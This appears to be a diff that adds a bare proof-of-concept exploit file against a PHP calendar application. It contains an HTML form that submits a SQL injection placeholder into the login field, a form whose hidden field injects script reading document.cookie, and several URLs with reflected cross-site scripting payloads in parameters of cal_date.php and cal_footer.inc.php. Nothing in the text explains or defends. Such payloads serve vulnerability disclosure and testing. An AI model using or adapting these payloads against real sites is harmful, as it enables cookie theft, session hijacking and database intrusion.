@@ -1,0 +1,18 @@
+
+&lt;form action=&quot;http://www.example.com/cal_login.php?op=login&quot; method=&quot;post&quot; name=&quot;main&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;login&quot; value=&quot;&#039;SQL_CODE_HERE&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;&quot;/&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;
+&lt;/form&gt;
+
+http://www.example.com/cal_login.php/%27%3E%3Cscript%3Ealert%28123%29;%3C/script%3E
+
+&lt;form action=&quot;http://www.example.com/cal_catview.php?catop=viewcat&quot; method=&quot;post&quot; name=&quot;main&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;gocat&quot; value=&quot;&#039;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&quot;/&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;
+&lt;/form&gt;
+
+
+http://www.example.com/cal_date.php?frmname=%3C/script%3E%3Cscript%3Ealert%28123%29;%3C/script%3E
+
+http://www.example.com/cal_footer.inc.php?leftfooter=%3Cscript%3Ealert%28123%29;%3C/script%3E
